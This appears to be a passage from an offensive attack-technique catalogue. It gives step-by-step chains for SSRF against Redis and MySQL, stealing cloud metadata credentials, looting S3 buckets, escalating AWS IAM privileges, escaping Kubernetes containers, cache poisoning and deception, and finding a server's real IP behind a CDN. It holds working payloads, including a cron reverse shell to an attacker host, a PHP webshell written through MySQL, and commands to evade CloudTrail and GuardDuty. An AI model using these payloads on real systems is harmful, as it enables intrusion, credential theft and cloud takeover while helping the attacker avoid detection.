**4. 4. Write a Cron job**  _[linux]_
_Write a Cron reverse shell_
```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```

**5. 5. Master-slave replication RCE**
_Master-slave replication RCE_
```
# Use redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
Load a malicious module via Redis master-slave replication
```

**WAF/EDR bypass variants:**

**1. Gopher protocol construction**
_Use the Gopher protocol_
```
Use the Gopher protocol to construct a complete Redis command sequence
Can bypass Dict-protocol limitations
```

---

### SSRF attacking MySQL  `ssrf-mysql`
Use SSRF to attack an intranet MySQL service
Sub-category: **MySQL attack** · tags: `ssrf` `mysql` `gopher` `database`

**Prerequisites:** an SSRF vulnerability exists; a MySQL service exists on the intranet; the MySQL username is known

**Attack chain:**

**1. 1. MySQL protocol basics**
_MySQL protocol basics_
```
MySQL communication protocol:
- handshake packet
- authentication packet
- command packet
Requires constructing data that conforms to the protocol
```

**2. 2. Use Gopher to attack MySQL**
_Gopher protocol attacking MySQL_
```
# Construct a MySQL protocol data packet
# Requires generating it with a tool
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# Use sqlmap
gopher://127.0.0.1:3306/_[payload generated by sqlmap]
```

**3. 3. Use a tool to generate the payload**
_Use a tool to generate the payload_
```
# Use the Gopherus tool
python gopherus.py --exploit mysql
Enter the username and SQL command
Generate the Gopher URL

# Or use the mysql_gopher_attack tool
```

**4. 4. Execute SQL commands**
_Execute SQL commands_
```
SELECT * FROM users;
SELECT user(), version();
Write a WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```

**WAF/EDR bypass variants:**

**1. Passwordless MySQL**
_Exploit an empty-password configuration_
```
If MySQL allows empty-password connections
it is easier to construct the attack payload
```

---

### · Cloud security vulnerabilities

### Cloud SSRF to steal metadata credentials  `cloud-ssrf-metadata`
Use an SSRF vulnerability to access the instance metadata service (IMDS) of a cloud service (AWS/GCP/Azure) to obtain temporary IAM credentials. The attacker can use the obtained Access Key to take over cloud resources, achieving lateral escalation from a web vulnerability to the cloud environment.
Sub-category: **IMDS attack** · tags: `cloud security` `SSRF` `AWS` `GCP` `Azure` `IMDS` `metadata`

**Prerequisites:** the target runs in a cloud environment; an SSRF vulnerability exists; the instance is bound to an IAM role

**Attack chain:**

**1. 1. AWS metadata-service probing**
_Access the AWS EC2 instance metadata service via SSRF to obtain temporary IAM credentials_
```
# IMDSv1 — no special Header needed
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# Obtain the IAM role name
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Obtain temporary credentials
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# Obtain user data (may contain keys in startup scripts)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```

**2. 2. GCP/Azure metadata exploitation**
_Obtain metadata credentials and management tokens from GCP and Azure cloud environments_
```
# GCP metadata — requires the Metadata-Flavor header
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP obtain project info
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure management token
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**3. 3. Lateral movement with the obtained credentials**
_Use the stolen cloud credentials to enumerate cloud resources and permissions via the AWS CLI_
```
# Configure the AWS CLI with the stolen credentials
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# List S3 buckets
aws s3 ls

# Enumerate EC2 instances
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```

**4. 4. Deep exploitation — S3 data leak / privilege escalation**
_Use the obtained cloud credentials to export S3 data, check for IAM escalation possibilities, and extract secrets_
```
# S3 bucket data download
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# Check whether escalation is possible
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# Check Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```

**WAF/EDR bypass variants:**

**1. Bypass SSRF's IMDS protection**
_Bypass the SSRF filter on the IMDS address via IP transformation, DNS rebinding, and protocol smuggling_
```
# IMDSv2 requires a PUT to obtain a Token — try header injection
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP transformation
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS rebinding
http://169-254-169-254.attacker.com  # resolves to 169.254.169.254

# Protocol smuggling
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```

---

### S3 bucket misconfiguration exploitation  `cloud-s3-misconfig`
Use AWS S3 bucket access-control misconfigurations (public read/write/list) to obtain sensitive data or plant malicious files. Common in static-website hosting, log storage, and backup buckets, this can lead to data leakage, website tampering, or supply-chain attacks.
Sub-category: **S3 security** · tags: `cloud security` `S3` `AWS` `misconfiguration` `data leak`

**Prerequisites:** the target S3 bucket name is known; AWS CLI or HTTP access

**Attack chain:**

**1. 1. S3 bucket-name enumeration**
_Discover the target S3 bucket via domain variants, DNS records, and frontend code_
```
# Guess the bucket name based on the domain
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME check
dig +short CNAME {TARGET} | grep s3

# Discover from frontend resource URLs
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```

**2. 2. Permission enumeration**
_Test the S3 bucket's anonymous list, read, write permissions, and policy configuration_
```
# Test list permission
aws s3 ls "s3://{BUCKET}" --no-sign-request

# Test read permission
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# Test write permission
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# Check the Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# Check the ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```

**3. 3. Sensitive-data search**
_Enumerate all files in the bucket and specifically search for and download sensitive files_
```
# Recursively list all files
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# Search for sensitive files
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# Download key files
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# Search for backup databases
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```

**4. 4. Verify exploitation (static-website tampering / XSS)**
_Test the write permission of an S3 website bucket and verify whether custom HTML can be hosted (which can lead to XSS/tampering)_
```
# If the bucket hosts a static website and is writable
# Check whether it is a website bucket
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# Upload a (harmless) XSS test page
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# Verify it is accessible
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# Clean up the test file
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```

**WAF/EDR bypass variants:**

**1. Bypass S3 access restrictions**
_Bypass S3 access restrictions via region endpoint transformation, path format, and the authenticated-users group_
```
# Use a different region endpoint
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# Use the path format (may bypass some WAFs)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# Use authenticated AWS credentials from a different account
# (some bucket policies allow the "AuthenticatedUsers" group)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Signed-URL leak search
# Search on Google/GitHub: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```

---

### AWS IAM privilege escalation  `cloud-iam-escalation`
After obtaining low-privilege AWS credentials, use over-permissioning in IAM policies (e.g. iam:PassRole, lambda:CreateFunction, etc.) to escalate to administrator. Covers 20+ known AWS IAM privilege-escalation paths.
Sub-category: **IAM escalation** · tags: `cloud security` `AWS` `IAM` `privilege escalation` `Privilege Escalation`

**Prerequisites:** AWS credentials have been obtained; the IAM policy has over-permissioning

**Attack chain:**

**1. 1. Enumerate current permissions**
_Enumerate all permissions and policies of the current IAM identity_
```
# Basic identity info
aws sts get-caller-identity

# Enumerate the current user's policies
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# Get policy details
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# Automate with the enumerate-iam tool
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```

**2. 2. iam:PassRole + Lambda escalation**
_Use iam:PassRole and lambda:CreateFunction to create a Lambda function using a high-privilege role to achieve escalation_
```
# Create a malicious Lambda function (requires iam:PassRole + lambda:CreateFunction)

# Create the Lambda code
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # Attach an admin policy to the current user
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# Create the Lambda and associate the high-privilege role
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# Trigger execution
aws lambda invoke --function-name security-test /tmp/output.json
```

**3. 3. Other escalation paths**
_Demonstrate multiple IAM escalation paths: policy-version override, key creation, and role trust-policy modification_
```
# Path 1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:CreateAccessKey (create a key for another user)
aws iam create-access-key --user-name admin

# Path 3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```

**4. 4. Automated escalation tools**
_Use PACU, pmapper, and cloudfox to automatically discover and exploit IAM escalation paths_
```
# PACU — AWS penetration-testing framework
python3 pacu.py
# In PACU:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper — IAM policy visualization and escalation-path analysis
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox enumeration
cloudfox aws --profile target all-checks
```

**WAF/EDR bypass variants:**

**1. Bypass CloudTrail and GuardDuty detection**
_Reduce the risk of detection by using non-standard regions, slow operations, and session tokens_
```
# Use a non-standard region (may not have CloudTrail enabled)
aws iam list-users --region af-south-1

# Slow operations to avoid triggering anomaly detection
sleep $((RANDOM % 60 + 30))  # 30-90 second random delay

# Use inter-service AWS calls to reduce direct API logs
# Execute indirectly via Lambda/SSM rather than direct CLI calls

# Use a Session Token rather than long-term credentials
aws sts get-session-token --duration-seconds 3600
```

---

### Kubernetes container escape  `cloud-k8s-escape`
Given a shell inside a Kubernetes Pod, use misconfigurations (privileged container, host-path mount, high-privilege ServiceAccount) to achieve container escape, then control the host or the entire Kubernetes cluster.
Sub-category: **container security** · tags: `cloud security` `Kubernetes` `container escape` `Docker` `privileged container`

**Prerequisites:** a shell inside the Pod has been obtained; the Pod has a misconfiguration

**Attack chain:**

**1. 1. Container-environment reconnaissance**
_Confirm the container environment and check the privileged mode, SA token, and kernel capabilities_
```
# Confirm you are in a container
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# Check the ServiceAccount token
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check the privileged mode
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```

**2. 2. Privileged-container escape**
_Use a privileged container's disk mount and cgroup release_agent to achieve host command execution_
```
# Method 1: mount the host root filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Method 2: escape via cgroup (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

**3. 3. Use the ServiceAccount to take over the cluster**
_Use the ServiceAccount token in the Pod to enumerate permissions and obtain cluster Secrets via the K8s API_
```
# Read the SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Enumerate permissions
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# List all Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# List Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```

**4. 4. Create a privileged Pod for a reverse shell**
_Create a privileged Pod that mounts the host root directory to achieve container escape_
```
# If the SA has create-pods permission
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```

**WAF/EDR bypass variants:**

**1. Bypass PodSecurityPolicy/OPA**
_Bypass Pod security policies by switching namespaces, using ephemeral containers, and CronJobs_
```
# Use a non-default namespace (may not have PSP applied)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# Use an ephemeral container (may bypass PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# Use a CronJob rather than a Pod (some policies do not cover it)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```

---

### · Cache and CDN security

### Cache poisoning  `cache-poisoning`
Web cache poisoning attack
Sub-category: **cache poisoning** · tags: `cache` `poisoning` `web-cache`

**Prerequisites:** the target uses a cache; the cache key is misconfigured

**Attack chain:**

**1. Probe the cache**
_Probe the cache status_
```
Response header: X-Cache: hit/miss
```

**2. Unkeyed header**
_Inject an unkeyed header_
```
X-Forwarded-Host: attacker.com
```

**3. Cache poisoning**
_Poison the cache_
```
GET /?q=test HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

**4. Fat GET**
_Fat GET poisoning_
```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned
```

**WAF/EDR bypass variants:**

**1. Unkeyed-header exploitation**
_Identify HTTP headers that are not in the cache key but affect the response content (e.g. X-Forwarded-Host), and store the poisoned response in the cache by repeatedly sending requests carrying the malicious header_
```
# Common unkeyed headers:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# Discover unkeyed headers:
# Use the Param Miner Burp extension for automatic detection
# Manual comparison: whether the response changes after adding a header but the cache key stays the same

# Poisoning steps:
# 1. Send requests with the malicious header until the cache hits
# 2. Verify that other users accessing the same URL receive the poisoned response
```

**2. Parameter cloaking and HTTP/2-exclusive-header poisoning**
_Use the fact that tracking parameters such as UTM are not included in the cache key to inject malicious content, or use a Fat GET request body to override query parameters, and HTTP/2-exclusive pseudo-headers to trigger differential handling_
```
# Parameter Cloaking:
# UTM parameters are usually not in the cache key:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET poisoning:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2-exclusive headers:
:method: GET
:path: /
transfer-encoding: chunked
```

---

### Cache deception  `cache-deception`
Use the difference between the web cache and server path parsing to trick the CDN/cache layer into caching a dynamic page containing sensitive information
Sub-category: **Deception** · tags: `cache` `deception` `auth`

**Prerequisites:** the target uses a CDN or reverse-proxy cache; there is a path-parsing difference (the backend ignores the path suffix); the cache policy is based on the URL extension

**Attack chain:**

**1. Probe cache behavior**  _[linux]_
_Detect the target's cache layer and cache-policy configuration_
```
# Detect whether a cache layer exists:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# Test the cache policy (whether static files are cached):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# Compare with a dynamic page:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
```

**2. Path-confusion cache deception**
_Append a static-file extension to a dynamic page URL to trigger caching_
```
# Core technique: append a static-file extension to a dynamic page URL
# The backend parses /account/profile.css as /account (ignoring the non-existent path)
# The cache layer sees the .css extension, thinks it is a static resource, and caches it

# Step 1: construct the deception URL (accessed as the victim)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# Step 2: the attacker accesses the cached content without authentication
curl "http://target.com/account/profile.css"

# Multiple path variants:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"
```

**3. Advanced cache-deception variants**
_Advanced cache deception exploiting path separators, parameters, and normalization differences_
```
# Separator confusion (different components interpret path separators differently):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# Parameter pollution:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization differences:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"
```

**4. Full attack-flow verification**
_Demonstrate the complete attack chain from inducing caching to stealing data_
```
# Full attack demonstration:

# 1. First confirm the dynamic page contains sensitive information:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"

# 2. Induce the victim to visit the deception URL (via a phishing email/message):
# The victim clicks: http://target.com/account/avatar.jpg
# This caches their /account page (with personal info) as an "image"

# 3. The attacker accesses the same URL to obtain the cached sensitive information:
curl "http://target.com/account/avatar.jpg"
# Returns the victim's account page (containing email, phone, address, etc.)

# 4. Verify the cache hit:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# Expect to see: X-Cache: HIT
```

**WAF/EDR bypass variants:**

**1. Path-separator confusion**
_Trigger caching by exploiting the inconsistent parsing of separators such as semicolon, newline, and hash between the cache server and the origin_
```
# Exploit the cache server's differential parsing of path separators
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL-encoded separators
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css
```

**2. RPO relative-path overwrite**
_Use relative path overwrite (RPO) so the browser requests a sensitive page but the cache server caches it as a static resource_
```
# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# Path-parameter injection
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# Different cache-key manipulation
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css
```

**3. Cache-vs-origin normalization differences**
_Exploit the difference in URL normalization between the CDN/reverse proxy and the origin to make the cache mistakenly cache sensitive content_
```
# Cloudflare/Varnish path-normalization differences
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# Double-slash confusion
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# Exploit missing Vary header
curl -H "Accept: text/css" https://target.com/account/settings
```

---

### CDN bypass  `cdn-bypass`
Bypass the CDN to find the real IP
Sub-category: **CDN** · tags: `cdn` `bypass` `recon`

**Prerequisites:** the target uses a CDN

**Attack chain:**

**1. Historical DNS**
_Find the IP from before the CDN was used_
```
# Query DNS history to obtain the real IP:
# 1. SecurityTrails (requires an API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. Online DNS DB queries:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys search:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. Use FOFA:
# domain="target.com" && type="A"

# 6. Multi-location Ping comparison:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
```

**2. Email headers**
_Look at the Received header in email source_
```
# Leak the real IP via email headers:
# 1. Trigger the target site to send an email (registration/password recovery/subscription):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. Look at the raw headers of the received email (Gmail: Show original):
# Find the IP in the following fields:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. Use swaks to trigger sending an email:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. Analyze the email headers:
# The bottommost Received field usually contains the source server's real IP

# 5. If the target has an RSS subscription:
# After subscribing, look at the request source IP
curl "http://target.com/rss" -v
```

**3. DNS-history and certificate-transparency queries**
_Find the real IP behind the CDN via DNS history, certificate transparency, and search engines_
```
# 1. DNS-history query:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# Online queries:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. Certificate Transparency logs (CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys search:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan search:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com
```

**4. Subdomain and related-service probing for the real IP**  _[linux]_
_Discover the real IP via subdomains, email records, active connections, etc._
```
# 1. Subdomains may not go through the CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX records (mail servers usually do not go through the CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. IPs in the SPF record:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50 may be the real IP

# 4. Trigger the target server to make an active connection:
# Leave a URL on the target site (e.g. an avatar, webhook) pointing to your own server
# Look at the connecting IP (this is the target's outbound IP, usually the real IP):
# nc -lvp 8888

# 5. SSRF exploitation:
# If an SSRF vulnerability exists, make the server connect externally to obtain the IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
```

**5. Verify the real IP and access it directly**  _[linux]_
_Verify the candidate IP and access it directly to bypass CDN protection_
```
# 1. Verify whether the candidate IP is the real server:
REAL_IP="203.0.113.50"

# Direct IP access (specify the domain with the Host header):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS access (ignore the certificate):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. Compare responses to confirm:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. Modify hosts to bypass the CDN for testing:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. Directly penetrate the real IP (bypassing the CDN's WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# The CDN's WAF usually only protects the CDN entry; directly accessing the real IP can bypass it
```

**WAF/EDR bypass variants:**

**1. Various techniques to bypass the CDN's WAF**
_Use the real IP and non-standard ports to bypass the CDN's WAF protection_
```
# Once the real IP is found, the CDN's WAF is completely bypassed
# But if the target itself also has a WAF, you still need to:

# 1. Access directly via the real IP (bypassing the CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. If the CDN only WAFs common ports:
# Scan for web services on non-standard ports:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6 bypass (the CDN may only protect IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. Origin IP-allowlist probing:
# Some origins are configured to allow only CDN IPs
# Try forging the CDN's IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
```

### SSRF universal bypass trio — UA header / DNS rebinding / 302 redirect

The server has a URL allowlist / IP validation / private-range filter, but **the content fetched during validation is not the same as the content fetched during the actual request**. The following three bypass techniques respectively attack the "User-Agent branch," the "DNS-resolution time window," and "redirect following."

#### 1. UA-header branch bypass (common in avatar / image-download endpoints)

The backend routes by `User-Agent`; the internal proxy / business client takes the "no-validation" branch, while a normal browser UA takes the "strict-validation" branch.

```php
<?php
$_user_agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($_user_agent, 'go-httpclient') !== false) {
    // Business internal uses the client, jump directly to the internal domain without validation
    header("Location: http://internal.test.qq.com/flag.html");
} else {
    // Normal users take the safe external link
    header("Location: https://example.com/public.png");
}
?>
```

```text
# Bypass: change the UA to the business client
curl -A "go-httpclient/1.0" "https://target.com/fetch?url=https://attacker.example/img"
curl -A "Java/1.8.0_271" ...
curl -A "okhttp/4.9.0" ...
curl -A "python-requests/2.28" ...
curl -A "PostmanRuntime/7.30" ...

# Check whether the response contains internal-domain content (304 / Location: intranet / abnormal content length) to judge whether the branch was hit
```

**Typical trigger points**: avatar upload (URL mode), rich-text "insert web image," webhook configuration, email attachment preview, URL link preview.

#### 2. DNS rebinding (TOCTOU)

The server resolves DNS first to do the allowlist check, then resolves again to make the request. **Between the two resolutions, the DNS record is switched** → the validation sees a public IP, the request hits an intranet IP.

```text
# Online rebinder (test environment; self-host for real engagements to avoid conflicts with others)
https://lock.cmpxchg8b.com/rebinder.html?1   # 1.1.1.1 ↔ 127.0.0.1 alternating
